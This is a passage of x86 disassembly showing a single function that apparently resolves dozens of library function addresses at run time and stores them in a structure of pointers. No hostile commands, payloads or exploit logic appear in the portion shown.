  4017a3:	8b e5                	mov    %ebp,%esp
  4017a5:	5d                   	pop    %ebp
  4017a6:	c2 bc 00             	ret    $0xbc
  4017a9:	cc                   	int3
  4017aa:	cc                   	int3
  4017ab:	cc                   	int3
  4017ac:	cc                   	int3
  4017ad:	cc                   	int3
  4017ae:	cc                   	int3
  4017af:	cc                   	int3
  4017b0:	55                   	push   %ebp
  4017b1:	8b ec                	mov    %esp,%ebp
  4017b3:	83 ec 24             	sub    $0x24,%esp
  4017b6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4017ba:	75 07                	jne    0x4017c3
  4017bc:	33 c0                	xor    %eax,%eax
  4017be:	e9 44 0b 00 00       	jmp    0x402307
  4017c3:	68 50 98 40 00       	push   $0x409850
  4017c8:	68 40 98 40 00       	push   $0x409840
  4017cd:	ff 15 08 90 40 00    	call   *0x409008
  4017d3:	50                   	push   %eax
  4017d4:	ff 15 04 90 40 00    	call   *0x409004
  4017da:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4017dd:	89 01                	mov    %eax,(%ecx)
  4017df:	68 30 98 40 00       	push   $0x409830
  4017e4:	68 40 98 40 00       	push   $0x409840
  4017e9:	ff 15 08 90 40 00    	call   *0x409008
  4017ef:	50                   	push   %eax
  4017f0:	ff 15 04 90 40 00    	call   *0x409004
  4017f6:	8b 55 08             	mov    0x8(%ebp),%edx
  4017f9:	89 42 04             	mov    %eax,0x4(%edx)
  4017fc:	68 20 98 40 00       	push   $0x409820
  401801:	68 40 98 40 00       	push   $0x409840
  401806:	ff 15 08 90 40 00    	call   *0x409008
  40180c:	50                   	push   %eax
  40180d:	ff 15 04 90 40 00    	call   *0x409004
  401813:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401816:	89 41 08             	mov    %eax,0x8(%ecx)
  401819:	68 14 98 40 00       	push   $0x409814
  40181e:	68 40 98 40 00       	push   $0x409840
  401823:	ff 15 08 90 40 00    	call   *0x409008
  401829:	50                   	push   %eax
  40182a:	ff 15 04 90 40 00    	call   *0x409004
  401830:	8b 55 08             	mov    0x8(%ebp),%edx
  401833:	89 42 0c             	mov    %eax,0xc(%edx)
  401836:	68 00 98 40 00       	push   $0x409800
  40183b:	68 40 98 40 00       	push   $0x409840
  401840:	ff 15 08 90 40 00    	call   *0x409008
  401846:	50                   	push   %eax
  401847:	ff 15 04 90 40 00    	call   *0x409004
  40184d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401850:	89 41 10             	mov    %eax,0x10(%ecx)
  401853:	68 f4 97 40 00       	push   $0x4097f4
  401858:	68 40 98 40 00       	push   $0x409840
  40185d:	ff 15 08 90 40 00    	call   *0x409008
  401863:	50                   	push   %eax
  401864:	ff 15 04 90 40 00    	call   *0x409004
  40186a:	8b 55 08             	mov    0x8(%ebp),%edx
  40186d:	89 42 14             	mov    %eax,0x14(%edx)
  401870:	68 e8 97 40 00       	push   $0x4097e8
  401875:	68 40 98 40 00       	push   $0x409840
  40187a:	ff 15 08 90 40 00    	call   *0x409008
  401880:	50                   	push   %eax
  401881:	ff 15 04 90 40 00    	call   *0x409004
  401887:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40188a:	89 41 18             	mov    %eax,0x18(%ecx)
  40188d:	68 d8 97 40 00       	push   $0x4097d8
  401892:	68 40 98 40 00       	push   $0x409840
  401897:	ff 15 08 90 40 00    	call   *0x409008
  40189d:	50                   	push   %eax
  40189e:	ff 15 04 90 40 00    	call   *0x409004
  4018a4:	8b 55 08             	mov    0x8(%ebp),%edx
  4018a7:	89 42 1c             	mov    %eax,0x1c(%edx)
  4018aa:	68 d0 97 40 00       	push   $0x4097d0
  4018af:	68 40 98 40 00       	push   $0x409840
  4018b4:	ff 15 08 90 40 00    	call   *0x409008
  4018ba:	50                   	push   %eax
  4018bb:	ff 15 04 90 40 00    	call   *0x409004
  4018c1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4018c4:	89 41 20             	mov    %eax,0x20(%ecx)
  4018c7:	68 c0 97 40 00       	push   $0x4097c0
  4018cc:	68 40 98 40 00       	push   $0x409840
  4018d1:	ff 15 08 90 40 00    	call   *0x409008
  4018d7:	50                   	push   %eax
  4018d8:	ff 15 04 90 40 00    	call   *0x409004
  4018de:	8b 55 08             	mov    0x8(%ebp),%edx
  4018e1:	89 42 24             	mov    %eax,0x24(%edx)
  4018e4:	68 b0 97 40 00       	push   $0x4097b0
  4018e9:	68 40 98 40 00       	push   $0x409840
  4018ee:	ff 15 08 90 40 00    	call   *0x409008
  4018f4:	50                   	push   %eax
  4018f5:	ff 15 04 90 40 00    	call   *0x409004
  4018fb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4018fe:	89 41 28             	mov    %eax,0x28(%ecx)
  401901:	68 a4 97 40 00       	push   $0x4097a4
  401906:	68 40 98 40 00       	push   $0x409840
  40190b:	ff 15 08 90 40 00    	call   *0x409008
  401911:	50                   	push   %eax
  401912:	ff 15 04 90 40 00    	call   *0x409004
  401918:	8b 55 08             	mov    0x8(%ebp),%edx
  40191b:	89 42 30             	mov    %eax,0x30(%edx)
  40191e:	68 98 97 40 00       	push   $0x409798
  401923:	68 40 98 40 00       	push   $0x409840
  401928:	ff 15 08 90 40 00    	call   *0x409008
  40192e:	50                   	push   %eax
  40192f:	ff 15 04 90 40 00    	call   *0x409004
  401935:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401938:	89 41 34             	mov    %eax,0x34(%ecx)
  40193b:	68 84 97 40 00       	push   $0x409784
  401940:	68 40 98 40 00       	push   $0x409840
  401945:	ff 15 08 90 40 00    	call   *0x409008
  40194b:	50                   	push   %eax
  40194c:	ff 15 04 90 40 00    	call   *0x409004
  401952:	8b 55 08             	mov    0x8(%ebp),%edx
  401955:	89 42 2c             	mov    %eax,0x2c(%edx)
  401958:	68 78 97 40 00       	push   $0x409778
  40195d:	68 40 98 40 00       	push   $0x409840
  401962:	ff 15 08 90 40 00    	call   *0x409008
  401968:	50                   	push   %eax
  401969:	ff 15 04 90 40 00    	call   *0x409004
  40196f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401972:	89 41 38             	mov    %eax,0x38(%ecx)
  401975:	68 5c 97 40 00       	push   $0x40975c
  40197a:	68 40 98 40 00       	push   $0x409840
  40197f:	ff 15 08 90 40 00    	call   *0x409008
  401985:	50                   	push   %eax
  401986:	ff 15 04 90 40 00    	call   *0x409004
  40198c:	8b 55 08             	mov    0x8(%ebp),%edx
  40198f:	89 42 3c             	mov    %eax,0x3c(%edx)
  401992:	68 48 97 40 00       	push   $0x409748
  401997:	68 40 98 40 00       	push   $0x409840
  40199c:	ff 15 08 90 40 00    	call   *0x409008
  4019a2:	50                   	push   %eax
  4019a3:	ff 15 04 90 40 00    	call   *0x409004
  4019a9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4019ac:	89 41 40             	mov    %eax,0x40(%ecx)
  4019af:	68 34 97 40 00       	push   $0x409734
  4019b4:	68 40 98 40 00       	push   $0x409840
  4019b9:	ff 15 08 90 40 00    	call   *0x409008
  4019bf:	50                   	push   %eax
  4019c0:	ff 15 04 90 40 00    	call   *0x409004
  4019c6:	8b 55 08             	mov    0x8(%ebp),%edx
  4019c9:	89 42 44             	mov    %eax,0x44(%edx)
  4019cc:	68 24 97 40 00       	push   $0x409724
  4019d1:	ff 15 00 90 40 00    	call   *0x409000
  4019d7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4019da:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  4019de:	0f 84 ea 00 00 00    	je     0x401ace
  4019e4:	68 14 97 40 00       	push   $0x409714
  4019e9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4019ec:	50                   	push   %eax
  4019ed:	ff 15 04 90 40 00    	call   *0x409004
  4019f3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4019f6:	89 81 e8 00 00 00    	mov    %eax,0xe8(%ecx)
  4019fc:	68 04 97 40 00       	push   $0x409704
  401a01:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a04:	52                   	push   %edx
  401a05:	ff 15 04 90 40 00    	call   *0x409004
  401a0b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a0e:	89 41 48             	mov    %eax,0x48(%ecx)
  401a11:	68 f8 96 40 00       	push   $0x4096f8
  401a16:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a19:	52                   	push   %edx
  401a1a:	ff 15 04 90 40 00    	call   *0x409004
  401a20:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a23:	89 41 4c             	mov    %eax,0x4c(%ecx)
  401a26:	68 e8 96 40 00       	push   $0x4096e8
  401a2b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a2e:	52                   	push   %edx
  401a2f:	ff 15 04 90 40 00    	call   *0x409004
  401a35:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a38:	89 41 50             	mov    %eax,0x50(%ecx)
  401a3b:	68 d8 96 40 00       	push   $0x4096d8
  401a40:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a43:	52                   	push   %edx
  401a44:	ff 15 04 90 40 00    	call   *0x409004
  401a4a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a4d:	89 41 54             	mov    %eax,0x54(%ecx)
  401a50:	68 c8 96 40 00       	push   $0x4096c8
  401a55:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a58:	52                   	push   %edx
  401a59:	ff 15 04 90 40 00    	call   *0x409004
  401a5f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a62:	89 41 58             	mov    %eax,0x58(%ecx)
  401a65:	68 b8 96 40 00       	push   $0x4096b8
  401a6a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a6d:	52                   	push   %edx
  401a6e:	ff 15 04 90 40 00    	call   *0x409004
  401a74:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a77:	89 41 5c             	mov    %eax,0x5c(%ecx)
  401a7a:	68 a4 96 40 00       	push   $0x4096a4
  401a7f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a82:	52                   	push   %edx
  401a83:	ff 15 04 90 40 00    	call   *0x409004
  401a89:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a8c:	89 41 60             	mov    %eax,0x60(%ecx)
  401a8f:	68 94 96 40 00       	push   $0x409694
  401a94:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401a97:	52                   	push   %edx
  401a98:	ff 15 04 90 40 00    	call   *0x409004
  401a9e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401aa1:	89 41 64             	mov    %eax,0x64(%ecx)
  401aa4:	68 84 96 40 00       	push   $0x409684
  401aa9:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401aac:	52                   	push   %edx
  401aad:	ff 15 04 90 40 00    	call   *0x409004
  401ab3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ab6:	89 41 68             	mov    %eax,0x68(%ecx)
  401ab9:	68 70 96 40 00       	push   $0x409670
  401abe:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401ac1:	52                   	push   %edx
  401ac2:	ff 15 04 90 40 00    	call   *0x409004
  401ac8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401acb:	89 41 6c             	mov    %eax,0x6c(%ecx)
  401ace:	68 64 96 40 00       	push   $0x409664
  401ad3:	ff 15 00 90 40 00    	call   *0x409000
  401ad9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401adc:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401ae0:	74 15                	je     0x401af7
  401ae2:	68 54 96 40 00       	push   $0x409654
  401ae7:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401aea:	52                   	push   %edx
  401aeb:	ff 15 04 90 40 00    	call   *0x409004
  401af1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401af4:	89 41 70             	mov    %eax,0x70(%ecx)
  401af7:	68 48 96 40 00       	push   $0x409648
  401afc:	ff 15 00 90 40 00    	call   *0x409000
  401b02:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401b05:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401b09:	0f 84 9f 00 00 00    	je     0x401bae
  401b0f:	68 3c 96 40 00       	push   $0x40963c
  401b14:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b17:	52                   	push   %edx
  401b18:	ff 15 04 90 40 00    	call   *0x409004
  401b1e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b21:	89 41 74             	mov    %eax,0x74(%ecx)
  401b24:	68 30 96 40 00       	push   $0x409630
  401b29:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b2c:	52                   	push   %edx
  401b2d:	ff 15 04 90 40 00    	call   *0x409004
  401b33:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b36:	89 41 78             	mov    %eax,0x78(%ecx)
  401b39:	68 28 96 40 00       	push   $0x409628
  401b3e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b41:	52                   	push   %edx
  401b42:	ff 15 04 90 40 00    	call   *0x409004
  401b48:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b4b:	89 41 7c             	mov    %eax,0x7c(%ecx)
  401b4e:	68 20 96 40 00       	push   $0x409620
  401b53:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b56:	52                   	push   %edx
  401b57:	ff 15 04 90 40 00    	call   *0x409004
  401b5d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b60:	89 81 80 00 00 00    	mov    %eax,0x80(%ecx)
  401b66:	68 18 96 40 00       	push   $0x409618
  401b6b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b6e:	52                   	push   %edx
  401b6f:	ff 15 04 90 40 00    	call   *0x409004
  401b75:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b78:	89 81 84 00 00 00    	mov    %eax,0x84(%ecx)
  401b7e:	68 10 96 40 00       	push   $0x409610
  401b83:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b86:	52                   	push   %edx
  401b87:	ff 15 04 90 40 00    	call   *0x409004
  401b8d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b90:	89 81 88 00 00 00    	mov    %eax,0x88(%ecx)
  401b96:	68 04 96 40 00       	push   $0x409604
  401b9b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b9e:	52                   	push   %edx
  401b9f:	ff 15 04 90 40 00    	call   *0x409004
  401ba5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ba8:	89 81 8c 00 00 00    	mov    %eax,0x8c(%ecx)
  401bae:	68 f8 95 40 00       	push   $0x4095f8
  401bb3:	ff 15 00 90 40 00    	call   *0x409000
  401bb9:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401bbc:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  401bc0:	74 60                	je     0x401c22
  401bc2:	68 e8 95 40 00       	push   $0x4095e8
  401bc7:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401bca:	52                   	push   %edx
  401bcb:	ff 15 04 90 40 00    	call   *0x409004
  401bd1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401bd4:	89 81 90 00 00 00    	mov    %eax,0x90(%ecx)
  401bda:	68 d4 95 40 00       	push   $0x4095d4
  401bdf:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401be2:	52                   	push   %edx
  401be3:	ff 15 04 90 40 00    	call   *0x409004
  401be9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401bec:	89 81 94 00 00 00    	mov    %eax,0x94(%ecx)
  401bf2:	68 c0 95 40 00       	push   $0x4095c0
  401bf7:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401bfa:	52                   	push   %edx
  401bfb:	ff 15 04 90 40 00    	call   *0x409004
  401c01:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c04:	89 81 98 00 00 00    	mov    %eax,0x98(%ecx)
  401c0a:	68 ac 95 40 00       	push   $0x4095ac
  401c0f:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401c12:	52                   	push   %edx
  401c13:	ff 15 04 90 40 00    	call   *0x409004
  401c19:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c1c:	89 81 9c 00 00 00    	mov    %eax,0x9c(%ecx)
  401c22:	68 a0 95 40 00       	push   $0x4095a0
  401c27:	ff 15 00 90 40 00    	call   *0x409000
  401c2d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c30:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  401c34:	74 18                	je     0x401c4e
  401c36:	68 8c 95 40 00       	push   $0x40958c
  401c3b:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401c3e:	52                   	push   %edx
  401c3f:	ff 15 04 90 40 00    	call   *0x409004
  401c45:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c48:	89 81 a0 00 00 00    	mov    %eax,0xa0(%ecx)
  401c4e:	68 80 95 40 00       	push   $0x409580
  401c53:	68 40 98 40 00       	push   $0x409840
  401c58:	ff 15 08 90 40 00    	call   *0x409008
  401c5e:	50                   	push   %eax
  401c5f:	ff 15 04 90 40 00    	call   *0x409004
  401c65:	8b 55 08             	mov    0x8(%ebp),%edx
  401c68:	89 82 a4 00 00 00    	mov    %eax,0xa4(%edx)
  401c6e:	68 70 95 40 00       	push   $0x409570
  401c73:	68 40 98 40 00       	push   $0x409840
  401c78:	ff 15 08 90 40 00    	call   *0x409008
  401c7e:	50                   	push   %eax
  401c7f:	ff 15 04 90 40 00    	call   *0x409004
  401c85:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c88:	89 81 a8 00 00 00    	mov    %eax,0xa8(%ecx)
  401c8e:	68 54 95 40 00       	push   $0x409554
  401c93:	68 40 98 40 00       	push   $0x409840
  401c98:	ff 15 08 90 40 00    	call   *0x409008
  401c9e:	50                   	push   %eax
  401c9f:	ff 15 04 90 40 00    	call   *0x409004
  401ca5:	8b 55 08             	mov    0x8(%ebp),%edx
  401ca8:	89 82 ac 00 00 00    	mov    %eax,0xac(%edx)
  401cae:	68 44 95 40 00       	push   $0x409544
  401cb3:	68 40 98 40 00       	push   $0x409840
  401cb8:	ff 15 08 90 40 00    	call   *0x409008
  401cbe:	50                   	push   %eax
  401cbf:	ff 15 04 90 40 00    	call   *0x409004
  401cc5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401cc8:	89 81 b0 00 00 00    	mov    %eax,0xb0(%ecx)
  401cce:	68 34 95 40 00       	push   $0x409534
  401cd3:	68 40 98 40 00       	push   $0x409840
  401cd8:	ff 15 08 90 40 00    	call   *0x409008
  401cde:	50                   	push   %eax
  401cdf:	ff 15 04 90 40 00    	call   *0x409004
  401ce5:	8b 55 08             	mov    0x8(%ebp),%edx
  401ce8:	89 82 b4 00 00 00    	mov    %eax,0xb4(%edx)
  401cee:	68 20 95 40 00       	push   $0x409520
  401cf3:	68 40 98 40 00       	push   $0x409840
  401cf8:	ff 15 08 90 40 00    	call   *0x409008
  401cfe:	50                   	push   %eax
  401cff:	ff 15 04 90 40 00    	call   *0x409004
  401d05:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401d08:	89 81 b8 00 00 00    	mov    %eax,0xb8(%ecx)
  401d0e:	68 10 95 40 00       	push   $0x409510
  401d13:	68 40 98 40 00       	push   $0x409840
  401d18:	ff 15 08 90 40 00    	call   *0x409008
  401d1e:	50                   	push   %eax
  401d1f:	ff 15 04 90 40 00    	call   *0x409004
  401d25:	8b 55 08             	mov    0x8(%ebp),%edx
  401d28:	89 82 bc 00 00 00    	mov    %eax,0xbc(%edx)
  401d2e:	68 00 95 40 00       	push   $0x409500
  401d33:	68 40 98 40 00       	push   $0x409840
  401d38:	ff 15 08 90 40 00    	call   *0x409008
  401d3e:	50                   	push   %eax
  401d3f:	ff 15 04 90 40 00    	call   *0x409004
  401d45:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401d48:	89 81 c0 00 00 00    	mov    %eax,0xc0(%ecx)
  401d4e:	68 e8 94 40 00       	push   $0x4094e8
  401d53:	68 40 98 40 00       	push   $0x409840
  401d58:	ff 15 08 90 40 00    	call   *0x409008
  401d5e:	50                   	push   %eax
  401d5f:	ff 15 04 90 40 00    	call   *0x409004
  401d65:	8b 55 08             	mov    0x8(%ebp),%edx
  401d68:	89 82 c4 00 00 00    	mov    %eax,0xc4(%edx)
  401d6e:	68 dc 94 40 00       	push   $0x4094dc
  401d73:	68 40 98 40 00       	push   $0x409840
  401d78:	ff 15 08 90 40 00    	call   *0x409008
  401d7e:	50                   	push   %eax
  401d7f:	ff 15 04 90 40 00    	call   *0x409004
  401d85:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401d88:	89 81 c8 00 00 00    	mov    %eax,0xc8(%ecx)
  401d8e:	68 cc 94 40 00       	push   $0x4094cc
  401d93:	68 40 98 40 00       	push   $0x409840
  401d98:	ff 15 08 90 40 00    	call   *0x409008
  401d9e:	50                   	push   %eax
  401d9f:	ff 15 04 90 40 00    	call   *0x409004
  401da5:	8b 55 08             	mov    0x8(%ebp),%edx
  401da8:	89 82 cc 00 00 00    	mov    %eax,0xcc(%edx)
  401dae:	68 c0 94 40 00       	push   $0x4094c0
  401db3:	68 40 98 40 00       	push   $0x409840
  401db8:	ff 15 08 90 40 00    	call   *0x409008
  401dbe:	50                   	push   %eax
  401dbf:	ff 15 04 90 40 00    	call   *0x409004
  401dc5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401dc8:	89 81 d0 00 00 00    	mov    %eax,0xd0(%ecx)
  401dce:	68 b4 94 40 00       	push   $0x4094b4
  401dd3:	68 40 98 40 00       	push   $0x409840
  401dd8:	ff 15 08 90 40 00    	call   *0x409008
  401dde:	50                   	push   %eax
  401ddf:	ff 15 04 90 40 00    	call   *0x409004
  401de5:	8b 55 08             	mov    0x8(%ebp),%edx
  401de8:	89 82 d4 00 00 00    	mov    %eax,0xd4(%edx)
  401dee:	68 a4 94 40 00       	push   $0x4094a4
  401df3:	68 40 98 40 00       	push   $0x409840
  401df8:	ff 15 08 90 40 00    	call   *0x409008
  401dfe:	50                   	push   %eax
  401dff:	ff 15 04 90 40 00    	call   *0x409004
  401e05:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e08:	89 81 d8 00 00 00    	mov    %eax,0xd8(%ecx)
  401e0e:	68 98 94 40 00       	push   $0x409498
  401e13:	68 40 98 40 00       	push   $0x409840
  401e18:	ff 15 08 90 40 00    	call   *0x409008
  401e1e:	50                   	push   %eax
  401e1f:	ff 15 04 90 40 00    	call   *0x409004
  401e25:	8b 55 08             	mov    0x8(%ebp),%edx
  401e28:	89 82 dc 00 00 00    	mov    %eax,0xdc(%edx)
  401e2e:	68 88 94 40 00       	push   $0x409488
  401e33:	68 40 98 40 00       	push   $0x409840
  401e38:	ff 15 08 90 40 00    	call   *0x409008
  401e3e:	50                   	push   %eax
  401e3f:	ff 15 04 90 40 00    	call   *0x409004
  401e45:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e48:	89 81 e0 00 00 00    	mov    %eax,0xe0(%ecx)
  401e4e:	68 74 94 40 00       	push   $0x409474
  401e53:	68 40 98 40 00       	push   $0x409840
  401e58:	ff 15 08 90 40 00    	call   *0x409008
  401e5e:	50                   	push   %eax
  401e5f:	ff 15 04 90 40 00    	call   *0x409004
  401e65:	8b 55 08             	mov    0x8(%ebp),%edx
  401e68:	89 82 e4 00 00 00    	mov    %eax,0xe4(%edx)
  401e6e:	68 5c 94 40 00       	push   $0x40945c
  401e73:	68 40 98 40 00       	push   $0x409840
  401e78:	ff 15 08 90 40 00    	call   *0x409008
  401e7e:	50                   	push   %eax
  401e7f:	ff 15 04 90 40 00    	call   *0x409004
  401e85:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e88:	89 81 ec 00 00 00    	mov    %eax,0xec(%ecx)
  401e8e:	68 44 94 40 00       	push   $0x409444
  401e93:	68 40 98 40 00       	push   $0x409840
  401e98:	ff 15 08 90 40 00    	call   *0x409008
  401e9e:	50                   	push   %eax
  401e9f:	ff 15 04 90 40 00    	call   *0x409004
  401ea5:	8b 55 08             	mov    0x8(%ebp),%edx
  401ea8:	89 82 f0 00 00 00    	mov    %eax,0xf0(%edx)
  401eae:	68 34 94 40 00       	push   $0x409434
  401eb3:	68 40 98 40 00       	push   $0x409840
  401eb8:	ff 15 08 90 40 00    	call   *0x409008
  401ebe:	50                   	push   %eax
  401ebf:	ff 15 04 90 40 00    	call   *0x409004
  401ec5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ec8:	89 81 f4 00 00 00    	mov    %eax,0xf4(%ecx)
  401ece:	68 24 94 40 00       	push   $0x409424
  401ed3:	68 40 98 40 00       	push   $0x409840
  401ed8:	ff 15 08 90 40 00    	call   *0x409008
  401ede:	50                   	push   %eax
  401edf:	ff 15 04 90 40 00    	call   *0x409004
  401ee5:	8b 55 08             	mov    0x8(%ebp),%edx
  401ee8:	89 82 f8 00 00 00    	mov    %eax,0xf8(%edx)
  401eee:	68 14 94 40 00       	push   $0x409414
  401ef3:	68 40 98 40 00       	push   $0x409840
  401ef8:	ff 15 08 90 40 00    	call   *0x409008
  401efe:	50                   	push   %eax
  401eff:	ff 15 04 90 40 00    	call   *0x409004
  401f05:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f08:	89 81 fc 00 00 00    	mov    %eax,0xfc(%ecx)
  401f0e:	68 08 94 40 00       	push   $0x409408
  401f13:	68 40 98 40 00       	push   $0x409840
  401f18:	ff 15 08 90 40 00    	call   *0x409008
  401f1e:	50                   	push   %eax
  401f1f:	ff 15 04 90 40 00    	call   *0x409004
  401f25:	8b 55 08             	mov    0x8(%ebp),%edx
  401f28:	89 82 00 01 00 00    	mov    %eax,0x100(%edx)
  401f2e:	68 f8 93 40 00       	push   $0x4093f8
  401f33:	68 40 98 40 00       	push   $0x409840
  401f38:	ff 15 08 90 40 00    	call   *0x409008
  401f3e:	50                   	push   %eax
  401f3f:	ff 15 04 90 40 00    	call   *0x409004
  401f45:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f48:	89 81 04 01 00 00    	mov    %eax,0x104(%ecx)
  401f4e:	68 e8 93 40 00       	push   $0x4093e8
  401f53:	68 40 98 40 00       	push   $0x409840
  401f58:	ff 15 08 90 40 00    	call   *0x409008
  401f5e:	50                   	push   %eax
  401f5f:	ff 15 04 90 40 00    	call   *0x409004
  401f65:	8b 55 08             	mov    0x8(%ebp),%edx
  401f68:	89 82 08 01 00 00    	mov    %eax,0x108(%edx)
  401f6e:	68 d4 93 40 00       	push   $0x4093d4
  401f73:	68 40 98 40 00       	push   $0x409840
  401f78:	ff 15 08 90 40 00    	call   *0x409008
  401f7e:	50                   	push   %eax
  401f7f:	ff 15 04 90 40 00    	call   *0x409004
  401f85:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f88:	89 81 0c 01 00 00    	mov    %eax,0x10c(%ecx)
  401f8e:	68 bc 93 40 00       	push   $0x4093bc
  401f93:	68 40 98 40 00       	push   $0x409840
  401f98:	ff 15 08 90 40 00    	call   *0x409008
  401f9e:	50                   	push   %eax
  401f9f:	ff 15 04 90 40 00    	call   *0x409004
  401fa5:	8b 55 08             	mov    0x8(%ebp),%edx
  401fa8:	89 82 10 01 00 00    	mov    %eax,0x110(%edx)
  401fae:	68 a8 93 40 00       	push   $0x4093a8
  401fb3:	68 40 98 40 00       	push   $0x409840
  401fb8:	ff 15 08 90 40 00    	call   *0x409008
  401fbe:	50                   	push   %eax
  401fbf:	ff 15 04 90 40 00    	call   *0x409004
  401fc5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401fc8:	89 81 14 01 00 00    	mov    %eax,0x114(%ecx)
  401fce:	68 a0 93 40 00       	push   $0x4093a0
  401fd3:	68 40 98 40 00       	push   $0x409840
  401fd8:	ff 15 08 90 40 00    	call   *0x409008
  401fde:	50                   	push   %eax
  401fdf:	ff 15 04 90 40 00    	call   *0x409004
  401fe5:	8b 55 08             	mov    0x8(%ebp),%edx
  401fe8:	89 82 18 01 00 00    	mov    %eax,0x118(%edx)
  401fee:	68 84 93 40 00       	push   $0x409384
  401ff3:	68 40 98 40 00       	push   $0x409840
  401ff8:	ff 15 08 90 40 00    	call   *0x409008
  401ffe:	50                   	push   %eax
  401fff:	ff 15 04 90 40 00    	call   *0x409004
  402005:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402008:	89 81 1c 01 00 00    	mov    %eax,0x11c(%ecx)
  40200e:	68 70 93 40 00       	push   $0x409370
  402013:	68 40 98 40 00       	push   $0x409840
  402018:	ff 15 08 90 40 00    	call   *0x409008
  40201e:	50                   	push   %eax
  40201f:	ff 15 04 90 40 00    	call   *0x409004
  402025:	8b 55 08             	mov    0x8(%ebp),%edx
  402028:	89 82 20 01 00 00    	mov    %eax,0x120(%edx)
  40202e:	68 60 93 40 00       	push   $0x409360
  402033:	68 40 98 40 00       	push   $0x409840
  402038:	ff 15 08 90 40 00    	call   *0x409008
  40203e:	50                   	push   %eax
  40203f:	ff 15 04 90 40 00    	call   *0x409004
  402045:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402048:	89 81 24 01 00 00    	mov    %eax,0x124(%ecx)
  40204e:	68 50 93 40 00       	push   $0x409350
  402053:	68 40 98 40 00       	push   $0x409840
  402058:	ff 15 08 90 40 00    	call   *0x409008
  40205e:	50                   	push   %eax
  40205f:	ff 15 04 90 40 00    	call   *0x409004
  402065:	8b 55 08             	mov    0x8(%ebp),%edx
  402068:	89 82 28 01 00 00    	mov    %eax,0x128(%edx)
  40206e:	68 3c 93 40 00       	push   $0x40933c
  402073:	68 40 98 40 00       	push   $0x409840
  402078:	ff 15 08 90 40 00    	call   *0x409008
  40207e:	50                   	push   %eax
